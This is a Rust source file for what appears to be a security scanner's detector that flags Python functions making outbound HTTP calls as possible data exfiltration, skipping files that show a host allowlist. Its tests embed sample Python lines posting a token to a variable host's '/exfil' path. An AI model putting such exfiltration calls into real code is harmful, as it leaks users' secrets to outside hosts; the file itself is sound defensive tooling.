//! Python [`super::super::FrameworkAdapter`] matching outbound-HTTP
//! sink constructions (`urllib.request.urlopen`, `requests.{get,post,put}`,
//! `httpx.{get,post}`, `aiohttp.ClientSession.post`).
//!
//! Phase 11 (Track L.9).  Fires when the function body invokes one
//! of the canonical Python HTTP-client entry points and the
//! surrounding source imports the matching client module.

use crate::dynamic::framework::{FrameworkAdapter, FrameworkBinding};
use crate::evidence::EntryKind;
use crate::summary::FuncSummary;
use crate::symbol::Lang;

pub struct DataExfilPythonAdapter;

const ADAPTER_NAME: &str = "data-exfil-python";

fn callee_is_outbound_http(name: &str) -> bool {
    let last = name.rsplit_once('.').map(|(_, s)| s).unwrap_or(name);
    matches!(
        last,
        "urlopen" | "get" | "post" | "put" | "patch" | "delete" | "request" | "Request" | "send"
    ) || matches!(
        name,
        "urllib.request.urlopen"
            | "requests.get"
            | "requests.post"
            | "requests.put"
            | "requests.patch"
            | "requests.delete"
            | "requests.request"
            | "httpx.get"
            | "httpx.post"
            | "httpx.AsyncClient.post"
            | "aiohttp.ClientSession.post"
    )
}

fn source_imports_python_http_client(file_bytes: &[u8]) -> bool {
    const NEEDLES: &[&[u8]] = &[
        b"import urllib.request",
        b"from urllib.request",
        b"import requests",
        b"from requests",
        b"import httpx",
        b"from httpx",
        b"import aiohttp",
        b"from aiohttp",
    ];
    NEEDLES
        .iter()
        .any(|n| file_bytes.windows(n.len()).any(|w| w == *n))
}

/// Returns `true` when the surrounding source visibly routes the
/// outbound URL through a host-allowlist / network-policy gate.
fn host_routed_through_allowlist(file_bytes: &[u8]) -> bool {
    const NEEDLES: &[&[u8]] = &[
        b"ALLOWLIST",
        b"allowlist",
        b"ALLOWED_HOSTS",
        b"allowed_hosts",
        b"in {'127.0.0.1'",
        b"in (\"127.0.0.1\"",
        b"in {\"127.0.0.1\"",
        b"if host == 'localhost'",
        b"netloc in ",
    ];
    NEEDLES
        .iter()
        .any(|n| file_bytes.windows(n.len()).any(|w| w == *n))
}

impl FrameworkAdapter for DataExfilPythonAdapter {
    fn name(&self) -> &'static str {
        ADAPTER_NAME
    }

    fn lang(&self) -> Lang {
        Lang::Python
    }

    fn detect(
        &self,
        summary: &FuncSummary,
        _ast: tree_sitter::Node<'_>,
        file_bytes: &[u8],
    ) -> Option<FrameworkBinding> {
        if host_routed_through_allowlist(file_bytes) {
            return None;
        }
        let matches_call = super::any_callee_matches(summary, callee_is_outbound_http);
        let matches_source = source_imports_python_http_client(file_bytes);
        if matches_call && matches_source {
            Some(FrameworkBinding {
                adapter: ADAPTER_NAME.to_owned(),
                kind: EntryKind::Function,
                route: None,
                request_params: Vec::new(),
                response_writer: None,
                middleware: Vec::new(),
            })
        } else {
            None
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn parse_python(src: &[u8]) -> tree_sitter::Tree {
        let mut parser = tree_sitter::Parser::new();
        let lang = tree_sitter::Language::from(tree_sitter_python::LANGUAGE);
        parser.set_language(&lang).unwrap();
        parser.parse(src, None).unwrap()
    }

    #[test]
    fn fires_on_urlopen() {
        let src: &[u8] = b"import urllib.request\n\
            def run(host):\n    urllib.request.urlopen(f\"http://{host}/exfil\")\n";
        let tree = parse_python(src);
        let summary = FuncSummary {
            name: "run".into(),
            callees: vec![crate::summary::CalleeSite::bare("urllib.request.urlopen")],
            ..Default::default()
        };
        assert!(
            DataExfilPythonAdapter
                .detect(&summary, tree.root_node(), src)
                .is_some()
        );
    }

    #[test]
    fn fires_on_requests_post() {
        let src: &[u8] = b"import requests\n\
            def run(host):\n    requests.post(f\"http://{host}/exfil\", data={'token': 'x'})\n";
        let tree = parse_python(src);
        let summary = FuncSummary {
            name: "run".into(),
            callees: vec![crate::summary::CalleeSite::bare("requests.post")],
            ..Default::default()
        };
        assert!(
            DataExfilPythonAdapter
                .detect(&summary, tree.root_node(), src)
                .is_some()
        );
    }

    #[test]
    fn skips_when_host_routed_through_allowlist() {
        let src: &[u8] = b"import requests\n\
            ALLOWLIST = {'127.0.0.1', 'localhost'}\n\
            def run(host):\n    if host not in ALLOWLIST:\n        return\n    requests.post(f\"http://{host}/exfil\")\n";
        let tree = parse_python(src);
        let summary = FuncSummary {
            name: "run".into(),
            callees: vec![crate::summary::CalleeSite::bare("requests.post")],
            ..Default::default()
        };
        assert!(
            DataExfilPythonAdapter
                .detect(&summary, tree.root_node(), src)
                .is_none()
        );
    }

    #[test]
    fn skips_plain_function() {
        let src: &[u8] = b"def add(a, b):\n    return a + b\n";
        let tree = parse_python(src);
        let summary = FuncSummary {
            name: "add".into(),
            ..Default::default()
        };
        assert!(
            DataExfilPythonAdapter
                .detect(&summary, tree.root_node(), src)
                .is_none()
        );
    }
}
